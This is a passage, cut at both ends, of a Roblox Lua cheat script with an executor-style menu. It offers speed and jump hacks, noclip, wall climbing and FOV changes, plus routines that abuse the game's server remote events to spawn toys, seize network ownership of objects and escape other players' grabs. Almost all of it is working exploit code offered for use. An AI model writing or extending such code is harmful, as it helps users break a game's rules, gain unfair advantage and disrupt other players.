                            obj.TeleportService:TeleportToPlaceInstance(placeId, id, obj.Players.LocalPlayer)
                        else
                            fn("Couldn't find another server, retrying standard teleport...")
                            obj.TeleportService:Teleport(placeId, obj.Players.LocalPlayer)
                        end
                    end)
                end
            end,
        })

        Camera_:AddToggle("3rd", {
            Text = "Third Person",
            Default = false,
            Callback = function(arg)
                if arg then
                    localPlayer.CameraMode = Enum.CameraMode.Classic
                    Camera.CameraType = Enum.CameraType.Custom
                    Camera.CameraSubject = localPlayer.Character:WaitForChild("Humanoid")
                    localPlayer.CameraMaxZoomDistance = 16456456546
                    localPlayer.CameraMinZoomDistance = 0.5
                else
                    localPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
                    Camera.CameraType = Enum.CameraType.Custom
                    Camera.CameraSubject = localPlayer.Character:WaitForChild("Humanoid")
                    localPlayer.CameraMaxZoomDistance = 0
                    localPlayer.CameraMinZoomDistance = 0
                end
            end,
        })

        Camera_:AddToggle("fovT", {
            Text = "Fov",
            Default = false,
            Callback = function(fovToggle)
                tbl2.fovToggle = fovToggle

                if tbl2.fovToggle then
                    Camera.FieldOfView = tbl2.fov
                else
                    Camera.FieldOfView = tbl2.deffov
                end
            end,
        })

        Camera_:AddSlider("Fovdo", {
            Text = "Fov °",
            Min = 10,
            Max = 120,
            Default = tbl2.fov,
            Rounding = 1,
            Callback = function(fov)
                tbl2.fov = fov

                if tbl2.fovToggle then
                    Camera.FieldOfView = tbl2.fov
                end
            end,
        })

        Main:AddToggle("Walkspeed", {
            Text = "Walk Speed",
            Default = false,
            Callback = function(walkSpeedToggle)
                tbl2.walkSpeedToggle = walkSpeedToggle

                task.spawn(function()
                    while tbl2.walkSpeedToggle do
                        local character = localPlayer.Character

                        if character and character:FindFirstChild("Humanoid") and character:FindFirstChild("HumanoidRootPart") then
                            local humanoidRootPart = character.HumanoidRootPart
                            humanoidRootPart.CFrame = humanoidRootPart.CFrame + character.Humanoid.MoveDirection * (tbl2.walkSpeed / 10)
                        end

                        task.wait()
                    end

                    local character = localPlayer.Character

                    if character and character:FindFirstChild("Humanoid") then
                        character.Humanoid.WalkSpeed = 16
                    end
                end)
            end,
        })

        Main:AddSlider("walkspeeds", {
            Text = "Speed",
            Default = tbl2.walkSpeed,
            Min = 0,
            Max = 300,
            Rounding = 1,
            Callback = function(walkSpeed)
                tbl2.walkSpeed = walkSpeed
                local character = localPlayer.Character

                if character and character:FindFirstChild("Humanoid") then
                    character.Humanoid.WalkSpeed = walkSpeed
                end
            end,
        })

        Main:AddToggle("infjump", {
            Text = "Infinite Jump",
            Default = false,
            Callback = function(infiniteJumpToggle)
                tbl2.infiniteJumpToggle = infiniteJumpToggle

                if tbl2.infiniteJumpToggle then
                    if tbl2.jumpConnection then
                        tbl2.jumpConnection:Disconnect()
                    end

                    tbl2.jumpConnection = obj.UserInputService.JumpRequest:Connect(function()
                        local character = localPlayer.Character
                        local humanoid = character and character:FindFirstChildOfClass("Humanoid")

                        if humanoid then
                            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                        end
                    end)
                elseif tbl2.jumpConnection then
                    tbl2.jumpConnection:Disconnect()
                    tbl2.jumpConnection = nil
                end
            end,
        })

        Main:AddSlider("Jumppower", {
            Text = "Jump Power",
            Min = 24,
            Max = 300,
            Default = tbl2.jumpPower,
            Rounding = 1,
            Callback = function(jumpPower)
                tbl2.jumpPower = jumpPower
                local character = localPlayer.Character

                if character and character:FindFirstChild("Humanoid") then
                    local humanoid = character.Humanoid
                    humanoid.UseJumpPower = true
                    humanoid.JumpPower = jumpPower
                end
            end,
        })

        Extra:AddToggle("Spider", {
            Text = "Spider",
            Default = false,
            Callback = function(spiderT)
                tbl2.spiderT = spiderT

                if tbl2.spiderCon then
                    tbl2.spiderCon:Disconnect()
                    tbl2.spiderCon = nil
                end

                if spiderT then
                    tbl2.spiderCon = obj.RunService.Heartbeat:Connect(function()
                        local v46 = getCharacter()
                        local v47 = hrp_()
                        local v48 = getLocalHum()
                        if not v46 or not v47 or not v48 then
                            return
                        end
                        local raycastParams = RaycastParams.new()
                        raycastParams.FilterDescendantsInstances = {v46}
                        raycastParams.FilterType = Enum.RaycastFilterType.Exclude

                        if obj.Workspace:Raycast(v47.Position, v47.CFrame.LookVector * 1.5, raycastParams) and v48.MoveDirection.Magnitude > 0 then
                            v47.AssemblyLinearVelocity = Vector3.new(v47.AssemblyLinearVelocity.X, tbl2.climbSpeed, v47.AssemblyLinearVelocity.Z)
                        end
                    end)
                end
            end,
        })

        Extra:AddSlider("ClimbSpeed", {
            Text = "Climb Speed",
            Min = 20,
            Max = 50,
            Default = 20,
            Rounding = 1,
            Callback = function(climbSpeed)
                tbl2.climbSpeed = climbSpeed
            end,
        })

        Extra:AddToggle("Nocli", {
            Text = "Noclip",
            Default = false,
            Callback = function(noclip)
                tbl2.noclip = noclip

                if tbl2.NoclipConnection then
                    tbl2.NoclipConnection:Disconnect()
                    tbl2.NoclipConnection = nil
                end

                if tbl2.noclip then
                    tbl2.NoclipConnection = obj.RunService.Stepped:Connect(function()
                        local v46 = getCharacter()

                        if v46 then
                            for i, descendant in ipairs(v46:GetDescendants()) do
                                if descendant:IsA("BasePart") then
                                    descendant.CanCollide = false
                                end
                            end
                        end
                    end)
                end
            end,
        })

        Extra:AddToggle("SpinC", {
            Text = "Spin Character",
            Default = false,
            Callback = function(arg)
                if arg then
                    tbl2.spincconnn = obj.RunService.Heartbeat:Connect(function()
                        local character = localPlayer.Character
                        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

                        if humanoidRootPart then
                            humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(0, math.rad(tbl2.spinsp), 0)
                        end
                    end)
                elseif tbl2.spincconnn then
                    tbl2.spincconnn:Disconnect()
                    tbl2.spincconnn = nil
                end
            end,
        })

        Extra:AddSlider("SpinS", {
            Text = "Spin Speed",
            Default = 5,
            Min = 1,
            Max = 50,
            Rounding = 1,
            Callback = function(spinsp)
                tbl2.spinsp = spinsp
            end,
        })

        Extra:AddSlider("FPScap", {
            Text = "FPS",
            Min = 5,
            Max = 10000,
            Default = 300,
            Rounding = 1,
            Callback = function(arg)
                setfpscap(arg)
            end,
        })

        v12:AddButton({
            Text = "Fake Korblox",
            Callback = function()
                task.spawn(function()
                    local v46 = getCharacter()
                    local rightLeg = v46:FindFirstChild("Right Leg")
                    local torso = v46:WaitForChild("Torso")
                    local humanoidRootPart = v46:WaitForChild("HumanoidRootPart")

                    if rightLeg and torso and humanoidRootPart then
                        local fallenPartsDestroyHeight = obj.Workspace.FallenPartsDestroyHeight
                        local cFrame = torso.CFrame
                        obj.Workspace.FallenPartsDestroyHeight = -100
                        RagdollRemote:FireServer(humanoidRootPart, 2)
                        task.wait(0.5)
                        rightLeg.CFrame = CFrame.new(0, -10000, 0)
                        task.wait(0.3)
                        torso.CFrame = CFrame.new(0, -9970, 0)
                        task.wait(0.5)
                        torso.CFrame = cFrame
                        task.wait(0.5)
                        obj.Workspace.FallenPartsDestroyHeight = fallenPartsDestroyHeight
                    end

                    task.wait(0.2)
                    local character = localPlayer.Character
                    local humanoidRootPart2 = character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if not humanoidRootPart2 then
                        return
                    end
                    fn4("NinjaKunai", humanoidRootPart2.CFrame * CFrame.new(0, 0, -5), Vector3.zero)
                    task.wait(0.5)
                    local v47 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                    local ninjaKunai = v47 and v47:FindFirstChild("NinjaKunai")
                    if not ninjaKunai or not ninjaKunai:FindFirstChild("StickyPart") then
                        return
                    end
                    humanoidRootPart2.CFrame = CFrame.new(ninjaKunai.StickyPart.Position + Vector3.new(0, 0, 2))
                    task.wait(0.1)

                    pcall(function()
                        SetNetworkOwner:FireServer(ninjaKunai.StickyPart, ninjaKunai.StickyPart.CFrame)
                    end)

                    pcall(function()
                        CreateGrabLine:FireServer(ninjaKunai.StickyPart, Vector3.zero, ninjaKunai.StickyPart.Position, false)
                    end)

                    task.wait(0.05)

                    pcall(function()
                        DestroyGrabLine:FireServer(ninjaKunai.StickyPart)
                    end)

                    for k, child in pairs(ninjaKunai:GetChildren()) do
                        if child:IsA("BasePart") then
                            child.CanTouch = false
                            child.CanQuery = false
                        end
                    end

                    local firePlayerPart = humanoidRootPart2:FindFirstChild("FirePlayerPart") or humanoidRootPart2:WaitForChild("FirePlayerPart", 5)

                    if not firePlayerPart then
                        local torso2 = v46:FindFirstChild("Torso")
                        local firePlayerPart2 = torso2 and torso2:FindFirstChild("FirePlayerPart")
                        firePlayerPart = firePlayerPart2
                    end

                    if not firePlayerPart then
                        firePlayerPart = humanoidRootPart2
                    end

                    if firePlayerPart then
                        local n2 = CFrame.new(0.5, -1.3, 0) * CFrame.Angles(0, 0, math.rad(90))

                        for i = 1, 10 do
                            task.spawn(function()
                                pcall(function()
                                    StickyPartEvent:FireServer(ninjaKunai.StickyPart, firePlayerPart, n2)
                                end)
                            end)
                        end
                    end

                    tbl2.kunaiMonitorConn = task.spawn(function()
                        local n2 = CFrame.new(0.5, -1.3, 0) * CFrame.Angles(0, 0, math.rad(90))
                        local n3 = 0

                        while ninjaKunai and ninjaKunai.Parent and ninjaKunai:FindFirstChild("StickyPart") do
                            task.wait(0.5)
                            local character2 = localPlayer.Character
                            local humanoidRootPart3 = character2 and character2:FindFirstChild("HumanoidRootPart")
                            if not humanoidRootPart3 then
                                continue
                            end
                            local stickyPart = ninjaKunai:FindFirstChild("StickyPart")
                            if not stickyPart then
                                break
                            end

                            if (stickyPart.Position - humanoidRootPart3.Position).Magnitude >= 2 then
                                local cFrame = humanoidRootPart3.CFrame
                                humanoidRootPart3.CFrame = stickyPart.CFrame * CFrame.new(0, 0, 4)
                                task.wait(0.2)

                                if n3 % 3 == 0 then
                                    pcall(function()
                                        SetNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
                                    end)
                                elseif n3 % 3 == 1 then
                                    pcall(function()
                                        CreateGrabLine:FireServer(stickyPart, Vector3.zero, stickyPart.Position, false)
                                    end)
                                else
                                    pcall(function()
                                        DestroyGrabLine:FireServer(stickyPart)
                                    end)
                                end

                                task.wait(0.05)
                                local firePlayerPart2 = humanoidRootPart3:FindFirstChild("FirePlayerPart") or humanoidRootPart3:WaitForChild("FirePlayerPart", 5) or character2:FindFirstChild("Torso"):FindFirstChild("FirePlayerPart") or humanoidRootPart3

                                if firePlayerPart2 then
                                    pcall(function()
                                        StickyPartEvent:FireServer(stickyPart, firePlayerPart2, n2)
                                    end)
                                end

                                task.wait(0.1)
                                humanoidRootPart3.CFrame = cFrame
                                n3 = n3 + 1
                            end
                        end
                    end)
                end)
            end,
        })

        v13:AddToggle("Antigrab", {
            Text = "Anti-Grab",
            Default = false,
            Callback = function(arg)
                if arg then
                    if not tbl2.AntigrabCon then
                        tbl2.AntigrabCon = obj.RunService.RenderStepped:Connect(function()
                            local v46 = getCharacter()
                            local humanoidRootPart = v46 and v46:FindFirstChild("HumanoidRootPart")
                            local humanoid = v46 and v46:FindFirstChild("Humanoid")

                            if humanoidRootPart and humanoid then
                                if humanoidRootPart.ReceiveAge == 0 then
                                    if humanoidRootPart.ReceiveAge == 0 then
                                        humanoidRootPart.Anchored = false
                                    end
                                else
                                    humanoidRootPart.Anchored = true

                                    if isHeld then
                                        isHeld.Value = false
                                    end

                                    task.spawn(function()
                                        Struggle:FireServer()
                                        RagdollRemote:FireServer(humanoidRootPart, 0)
                                    end)

                                    obj.ContextActionService:UnbindAction("JumpRemover")
                                    humanoid.AutoRotate = true

                                    if humanoidRootPart:FindFirstChild("RootJoint") then
                                        humanoidRootPart.RootJoint.Enabled = true
                                    end

                                    humanoidRootPart.Anchored = false
                                end
                            end
                        end)
                    end
                elseif tbl2.AntigrabCon then
                    tbl2.AntigrabCon:Disconnect()
                    tbl2.AntigrabCon = nil
                end
            end,
        })

        v13:AddToggle("Antiragrag", {
            Text = "Anti-Grab (Ragdoll)",
            Default = false,
            Callback = function(antiGrabRag)
                tbl2.AntiGrabRag = antiGrabRag

                for k, v46 in pairs(tbl2.Contuuti) do
                    if v46 then
                        v46:Disconnect()
                    end
                end

                table.clear(tbl2.Contuuti)

                if tbl2.AntiGrabRag then
                    local function fn40(character)
                        if not character or not tbl2.AntiGrabRag then
                            return
                        end
                        local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
                        local humanoid = character:WaitForChild("Humanoid", 5)
                        local head_ = character:WaitForChild("Head", 5)
                        if not humanoidRootPart or not humanoid or not head_ then
                            return
                        end

                        for k, child in pairs(character:GetChildren()) do
                            if child:IsA("BasePart") and child:FindFirstChild("BallSocketConstraint") and child.Name ~= "Head" then
                                child.BallSocketConstraint.Enabled = false

                                if child:FindFirstChild("RagdollLimbPart") then
                                    child.RagdollLimbPart.WeldConstraint.Enabled = false
                                end
                            end
                        end

                        tbl2.Contuuti.AGHead = head_.ChildAdded:Connect(function(child)
                            if child.Name == "PartOwner" and not tbl2.AntigrabRGProc then
                                tbl2.AntigrabRGProc = true
                                humanoid.Sit = false
                                Struggle:FireServer(localPlayer)

                                task.spawn(function()
                                    while head_ and head_:FindFirstChild("PartOwner") or isHeld.Value do
                                        Struggle:FireServer(localPlayer)
                                        RagdollRemote:FireServer(humanoidRootPart, 0)
                                        task.wait()
                                    end
                                end)

                                humanoidRootPart.Anchored = true

                                if not tbl2.AntigrabragWalk then
                                    tbl2.AntigrabragWalk = true

                                    while isHeld.Value and task.wait() do
                                        humanoidRootPart.CFrame = humanoidRootPart.CFrame + humanoid.MoveDirection * 0.43
                                    end
                                end

                                humanoidRootPart.Anchored = false
                                tbl2.AntigrabRGProc = false
                                tbl2.AntigrabragWalk = false
                            end
                        end)

                        local ragdolled = humanoid:WaitForChild("Ragdolled", 5)

                        if ragdolled then
                            tbl2.Contuuti.AGRagdoll = ragdolled.Changed:Connect(function()
                                if humanoid.Ragdolled.Value then
                                    for k, child in pairs(character:GetChildren()) do
                                        if child:IsA("BasePart") and child:FindFirstChild("BallSocketConstraint") and child.Name ~= "Head" then
                                            child.BallSocketConstraint.Enabled = false

                                            if child:FindFirstChild("RagdollLimbPart") then
                                                child.RagdollLimbPart.WeldConstraint.Enabled = false
                                            end
                                        end
                                    end
                                end
                            end)
                        end

                        local weldHRP = humanoidRootPart:WaitForChild("WeldHRP", 5)

                        if weldHRP then
                            tbl2.Contuuti.AGWeld = weldHRP.Changed:Connect(function()
                                if humanoidRootPart.WeldHRP.Enabled then
                                    while not humanoid.Sit do
                                        task.wait()
                                    end

                                    humanoid.Sit = false
                                    humanoid.AutoRotate = true
                                    humanoid.HipHeight = 1

                                    while humanoidRootPart.WeldHRP.Enabled and task.wait() do
                                        head_.CFrame = humanoidRootPart.CFrame + Vector3.new(0, 1.35, 0)
                                    end

                                    humanoid.HipHeight = 0
                                end
                            end)
                        end
                    end

                    fn40(localPlayer.Character)
                    tbl2.Contuuti.AGChar = localPlayer.CharacterAdded:Connect(fn40)
                else
                    local character = localPlayer.Character

                    if character then
                        for k, child in pairs(character:GetChildren()) do
                            if child:IsA("BasePart") and child:FindFirstChild("BallSocketConstraint") and child.Name ~= "Head" then
                                child.BallSocketConstraint.Enabled = false

                                if child:FindFirstChild("RagdollLimbPart") then
                                    child.RagdollLimbPart.WeldConstraint.Enabled = true
                                end
                            end
                        end
                    end
                end
            end,
        })

        v13:AddToggle("Antigucci", {
            Text = "Anti-Gucci (Blobman)",
            Default = false,
            Callback = function(arg)
                tbl2.gucciRunId = tbl2.gucciRunId + 1

                if arg then
                    local gucciRunId = tbl2.gucciRunId
                    local flag = false
                    local character = localPlayer.Character
                    local result = character or localPlayer.CharacterAdded:Wait()
                    local humanoid = fn3(result, "Humanoid")
                    local humanoidRootPart = fn3(result, "HumanoidRootPart")
                    if not humanoid or not humanoidRootPart then
                        return
                    end

                    pcall(function()
                        humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
                    end)

                    task.spawn(function()
                        local now2 = tick()

                        while tick() - now2 < 0.8 and gucciRunId == tbl2.gucciRunId do
                            if humanoidRootPart and humanoidRootPart.Parent then
                                humanoidRootPart.Velocity = Vector3.zero
                                humanoidRootPart.RotVelocity = Vector3.zero
                            end

                            obj.RunService.Heartbeat:Wait()
                        end
                    end)

                    local CreatureBlobman = fn4("CreatureBlobman", humanoidRootPart.CFrame * CFrame.new(0, 0, -5), Vector3.new(0, -15.716, 0))
                    if not CreatureBlobman then
                        return
                    end
                    local head_ = fn3(CreatureBlobman, "Head")
                    local grabbableHitbox = fn3(CreatureBlobman, "GrabbableHitbox")
                    local vehicleSeat = fn3(CreatureBlobman, "VehicleSeat")

                    task.spawn(function()
                        local now2 = tick()

                        while gucciRunId == tbl2.gucciRunId and not flag and tick() - now2 < 1.2 do
                            if grabbableHitbox and grabbableHitbox:IsA("BasePart") and SetNetworkOwner then
                                pcall(function()
                                    SetNetworkOwner:FireServer(grabbableHitbox, grabbableHitbox.CFrame)
                                end)
                            end

                            if head_ and head_:IsA("BasePart") and SetNetworkOwner then
                                pcall(function()
                                    SetNetworkOwner:FireServer(head_, head_.CFrame)
                                end)
                            end

                            if vehicleSeat and vehicleSeat.Parent and vehicleSeat.Occupant ~= humanoid then
                                pcall(function()
                                    vehicleSeat:Sit(humanoid)
                                end)
                            end

                            if RagdollRemote then
                                pcall(function()
                                    RagdollRemote:FireServer(humanoidRootPart, 0.09)
                                end)
                            end

                            obj.RunService.Heartbeat:Wait()
                        end
                    end)

                    task.wait(0.45)

                    if gucciRunId ~= tbl2.gucciRunId then
                        if CreatureBlobman and CreatureBlobman.Parent then
                            CreatureBlobman:Destroy()
                        end

                        return
                    end

                    flag = true

                    pcall(function()
                        humanoid.Sit = false
                    end)

                    if vehicleSeat and vehicleSeat.Parent then
                        vehicleSeat.Disabled = true
                        vehicleSeat.CanTouch = false
                        vehicleSeat.CanQuery = false

                        for k, child in pairs(vehicleSeat:GetChildren()) do
                            if child:IsA("Weld") or child.Name == "SeatWeld" then
                                child:Destroy()
                            end
                        end
                    end

                    pcall(function()
                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    end)

                    task.wait(0.05)

                    if RagdollRemote then
                        pcall(function()
                            RagdollRemote:FireServer(humanoidRootPart, false)
                        end)
                    end

                    pcall(function()
                        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                    end)

                    CreatureBlobman.Name = "Gucci"

                    for k, descendant in pairs(CreatureBlobman:GetDescendants()) do
                        if descendant:IsA("BasePart") then
                            descendant.CanCollide = false
                            descendant.CanTouch = false
                            descendant.CanQuery = false
                            descendant.Massless = true
                        end
                    end

                    task.spawn(function()
                        while gucciRunId == tbl2.gucciRunId and head_ and head_.Parent do
                            if head_ and head_.Parent then
                                head_.CFrame = CFrame.new(head_.Position.X, 100000, head_.Position.Z)
                            end

                            obj.RunService.Heartbeat:Wait()
                        end
                    end)

                    tbl2.gucciActive = true
                else
                    tbl2.gucciActive = false
                    local character = localPlayer.Character
                    local humanoid = character and character:FindFirstChild("Humanoid")

                    if humanoid then
                        pcall(function()
                            humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
                        end)
                    end

                    local v46 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                    if v46 then
                        for k, child in pairs(v46:GetChildren()) do
                            if child.Name == "Gucci" or child.Name == "CreatureBlobman" then
                                pcall(function()
                                    child:Destroy()
                                end)
                            end
                        end
                    end

                    if humanoid then
                        humanoid.Health = 0
                    end
                end
            end,
        })

        v13:AddToggle("RagdollGucci", {
            Text = "Anti-Gucci (Ragdoll)",
            Default = false,
            Callback = function(arg)
                if arg then
                    if tbl2.active then
                        tbl2.runId = tbl2.runId + 1
                        tbl2.active = false
                        tbl2.seatOccupied = false
                        tbl2.monitoring = false
                        tbl2.blobRef = nil
                        tbl2.ragdollLoopActive = false

                        if tbl2.ragdollTask then
                            task.cancel(tbl2.ragdollTask)
                            tbl2.ragdollTask = nil
                        end

                        tbl2.permRagActive = false

                        if tbl2.permRagTask then
                            task.cancel(tbl2.permRagTask)
                            tbl2.permRagTask = nil
                        end

                        local character = localPlayer.Character
                        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

                        if humanoidRootPart then
                            local remoteRef = tbl2.remoteRef

                            if not remoteRef then
                                local characterEvents = obj.ReplicatedStorage:FindFirstChild("CharacterEvents")
                                local ragdollRemote2 = characterEvents and characterEvents:FindFirstChild("RagdollRemote") or obj.ReplicatedStorage:FindFirstChild("RagdollRemote") or game:FindFirstChild("RagdollRemote", true)
                                remoteRef = ragdollRemote2

                                if remoteRef then
                                    tbl2.remoteRef = remoteRef
                                end
                            end

                            if remoteRef and remoteRef:IsA("RemoteEvent") then
                                pcall(function()
                                    remoteRef:FireServer(humanoidRootPart, 0)
                                end)
                            end
                        end

                        local v46 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                        if v46 then
                            for k, child in pairs(v46:GetChildren()) do
                                if child.Name == "Gucci" or child.Name == "CreatureBlobman" then
                                    pcall(function()
                                        child:Destroy()
                                    end)
                                end
                            end
                        end

                        task.wait(0.3)
                    end

                    tbl2.runId = tbl2.runId + 1
                    local runId = tbl2.runId
                    tbl2.setupDone = false
                    tbl2.seatOccupied = false
                    tbl2.monitoring = false
                    local character = localPlayer.Character
                    local result = character or localPlayer.CharacterAdded:Wait()
                    local humanoid = result:FindFirstChild("Humanoid")
                    local humanoid2 = humanoid or result:WaitForChild("Humanoid", 3)
                    local humanoidRootPart = result:FindFirstChild("HumanoidRootPart")
                    local humanoidRootPart2 = humanoidRootPart or result:WaitForChild("HumanoidRootPart", 3)
                    if not humanoid2 or not humanoidRootPart2 then
                        return
                    end

                    pcall(function()
                        humanoid2:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
                    end)

                    task.spawn(function()
                        local now2 = tick()

                        while tick() - now2 < 0.8 and runId == tbl2.runId do
                            if humanoidRootPart2 and humanoidRootPart2.Parent then
                                pcall(function()
                                    humanoidRootPart2.Velocity = Vector3.zero
                                    humanoidRootPart2.RotVelocity = Vector3.zero
                                end)
                            end

                            obj.RunService.Heartbeat:Wait()
                        end
                    end)

                    local v46 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                    local v47 = nil

                    if v46 then
                        local connection2 = nil

                        connection2 = v46.ChildAdded:Connect(function(child)
                            if child.Name == "CreatureBlobman" then
                                v47 = child
                                connection2:Disconnect()
                            end
                        end)

                        task.spawn(function()
                            local menuToys2 = obj.ReplicatedStorage:FindFirstChild("MenuToys")

                            if menuToys2 and menuToys2:FindFirstChild("SpawnToyRemoteFunction") then
                                pcall(function()
                                    menuToys2.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", humanoidRootPart2.CFrame * CFrame.new(0, 0, -5), Vector3.new(0, -15.716, 0))
                                end)
                            end
                        end)

                        local now2 = tick()

                        while not v47 and tick() - now2 < 4 do
                            obj.RunService.Heartbeat:Wait()
                        end

                        if connection2 then
                            connection2:Disconnect()
                        end
                    end

                    if not v47 then
                        return
                    end
                    local head_ = v47:FindFirstChild("Head")
                    local head_2 = head_ or v47:WaitForChild("Head", 3)
                    local grabbableHitbox = v47:FindFirstChild("GrabbableHitbox")
                    local grabbableHitbox2 = grabbableHitbox or v47:WaitForChild("GrabbableHitbox", 3)
                    local vehicleSeat = v47:FindFirstChild("VehicleSeat")
                    local vehicleSeat2 = vehicleSeat or v47:WaitForChild("VehicleSeat", 3)

                    if vehicleSeat2 and not tbl2.monitoring then
                        tbl2.monitoring = true
                        tbl2.blobRef = v47

                        task.spawn(function()
                            while tbl2.active and vehicleSeat2 and vehicleSeat2.Parent and v47 and v47.Parent do
                                local character2 = localPlayer.Character
                                local humanoid3 = character2 and localPlayer.Character:FindFirstChild("Humanoid")

                                if humanoid3 and vehicleSeat2.Occupant == humanoid3 then
                                    if not tbl2.seatOccupied then
                                        tbl2.seatOccupied = true

                                        if not tbl2.ragdollLoopActive then
                                            tbl2.ragdollLoopActive = true

                                            if tbl2.ragdollTask then
                                                task.cancel(tbl2.ragdollTask)
                                            end

                                            tbl2.ragdollTask = task.spawn(function()
                                                while tbl2.ragdollLoopActive do
                                                    local character3 = localPlayer.Character

                                                    if character3 then
                                                        local humanoid4 = character3:FindFirstChild("Humanoid")
                                                        local humanoidRootPart3 = character3:FindFirstChild("HumanoidRootPart")

                                                        if humanoid4 and humanoidRootPart3 and humanoid4.Health > 0 then
                                                            pcall(function()
                                                                humanoid4.Sit = true
                                                                humanoid4:ChangeState(Enum.HumanoidStateType.Running)
                                                            end)

                                                            local currentCamera = obj.Workspace.CurrentCamera

                                                            if currentCamera then
                                                                local lookVector = currentCamera.CFrame.LookVector

                                                                pcall(function()
                                                                    humanoidRootPart3.CFrame = CFrame.new(humanoidRootPart3.Position, humanoidRootPart3.Position + Vector3.new(lookVector.X, 0, lookVector.Z))
                                                                end)
                                                            end
                                                        end
                                                    end

                                                    task.wait()
                                                end
                                            end)
                                        end

                                        if not tbl2.permRagActive then
                                            tbl2.permRagActive = true

                                            if tbl2.permRagTask then
                                                task.cancel(tbl2.permRagTask)
                                            end

                                            tbl2.permRagTask = task.spawn(function()
                                                while tbl2.permRagActive do
                                                    local character3 = localPlayer.Character
                                                    local humanoidRootPart3 = character3 and character3:FindFirstChild("HumanoidRootPart")

                                                    if humanoidRootPart3 then
                                                        local remoteRef = tbl2.remoteRef

                                                        if not remoteRef then
                                                            local characterEvents = obj.ReplicatedStorage:FindFirstChild("CharacterEvents")
                                                            local ragdollRemote2 = characterEvents and characterEvents:FindFirstChild("RagdollRemote") or obj.ReplicatedStorage:FindFirstChild("RagdollRemote") or game:FindFirstChild("RagdollRemote", true)
                                                            remoteRef = ragdollRemote2

                                                            if remoteRef then
                                                                tbl2.remoteRef = remoteRef
                                                            end
                                                        end

                                                        if remoteRef and remoteRef:IsA("RemoteEvent") then
                                                            pcall(function()
                                                                remoteRef:FireServer(humanoidRootPart3, 1)
                                                            end)
                                                        end
                                                    end

                                                    task.wait(0.7)
                                                end
                                            end)
                                        end

                                        pcall(function()
                                            vehicleSeat2.Disabled = true
                                            vehicleSeat2.CanTouch = false
                                            vehicleSeat2.CanQuery = false

                                            for k, child in pairs(vehicleSeat2:GetChildren()) do
                                                if child:IsA("Weld") or child.Name == "SeatWeld" then
                                                    child:Destroy()
                                                end
                                            end
                                        end)

                                        if v47 then
                                            for k, descendant in pairs(v47:GetDescendants()) do
                                                if descendant:IsA("BasePart") then
                                                    pcall(function()
                                                        descendant.CanCollide = false
                                                        descendant.CanTouch = false
                                                        descendant.CanQuery = false
                                                        descendant.Massless = true
                                                    end)
                                                end
                                            end
                                        end
                                    end
                                elseif tbl2.seatOccupied then
                                    tbl2.seatOccupied = false
                                end

                                task.wait(0.1)
                            end

                            tbl2.monitoring = false
                            tbl2.seatOccupied = false
                            tbl2.blobRef = nil
                        end)
                    end

                    task.spawn(function()
                        local grabEvents = obj.ReplicatedStorage:FindFirstChild("GrabEvents")

                        local function fn40(arg2)
                            if arg2 and arg2:IsA("BasePart") and grabEvents and grabEvents:FindFirstChild("SetNetworkOwner") then
                                pcall(function()
                                    grabEvents.SetNetworkOwner:FireServer(arg2, arg2.CFrame)
                                end)
                            end
                        end

                        local now2 = tick()

                        while runId == tbl2.runId and not tbl2.setupDone and tick() - now2 < 1.2 do
                            if grabbableHitbox2 and grabbableHitbox2.Parent then
                                fn40(grabbableHitbox2)
                            end

                            if head_2 and head_2.Parent then
                                fn40(head_2)
                            end

                            if vehicleSeat2 and vehicleSeat2.Parent and vehicleSeat2.Occupant ~= humanoid2 then
                                pcall(function()
                                    vehicleSeat2:Sit(humanoid2)
                                end)
                            end

                            local characterEvents = obj.ReplicatedStorage:FindFirstChild("CharacterEvents")

                            if characterEvents and characterEvents:FindFirstChild("RagdollRemote") then
                                pcall(function()
                                    characterEvents.RagdollRemote:FireServer(humanoidRootPart2, 0.09)
                                end)
                            end

                            obj.RunService.Heartbeat:Wait()
                        end
                    end)

                    task.wait(0.45)

                    if runId ~= tbl2.runId then
                        if v47 and v47.Parent then
                            v47:Destroy()
                        end

                        return
                    end

                    tbl2.setupDone = true

                    pcall(function()
                        humanoid2.Sit = false
                    end)

                    pcall(function()
                        humanoid2:ChangeState(Enum.HumanoidStateType.Jumping)
                    end)

                    task.wait(0.05)
                    local characterEvents = obj.ReplicatedStorage:FindFirstChild("CharacterEvents")

                    if characterEvents and characterEvents:FindFirstChild("RagdollRemote") then
                        pcall(function()
                            characterEvents.RagdollRemote:FireServer(humanoidRootPart2, false)
                        end)
                    end

                    pcall(function()
                        humanoid2:ChangeState(Enum.HumanoidStateType.GettingUp)
                    end)

                    v47.Name = "Gucci"

                    for k, descendant in pairs(v47:GetDescendants()) do
                        if descendant:IsA("BasePart") then
                            pcall(function()
                                descendant.CanCollide = false
                                descendant.CanTouch = false
                                descendant.CanQuery = false
                                descendant.Massless = true
                            end)
                        end
                    end

                    task.spawn(function()
                        while runId == tbl2.runId and head_2 and head_2.Parent do
                            pcall(function()
                                head_2.CFrame = CFrame.new(head_2.Position.X, 100000, head_2.Position.Z)
                            end)

                            obj.RunService.Heartbeat:Wait()
                        end
                    end)

                    tbl2.active = true
                else
                    tbl2.runId = tbl2.runId + 1
                    tbl2.active = false
                    tbl2.seatOccupied = false
                    tbl2.monitoring = false
                    tbl2.blobRef = nil
                    tbl2.ragdollLoopActive = false

                    if tbl2.ragdollTask then
                        task.cancel(tbl2.ragdollTask)
                        tbl2.ragdollTask = nil
                    end

                    tbl2.permRagActive = false

                    if tbl2.permRagTask then
                        task.cancel(tbl2.permRagTask)
                        tbl2.permRagTask = nil
                    end

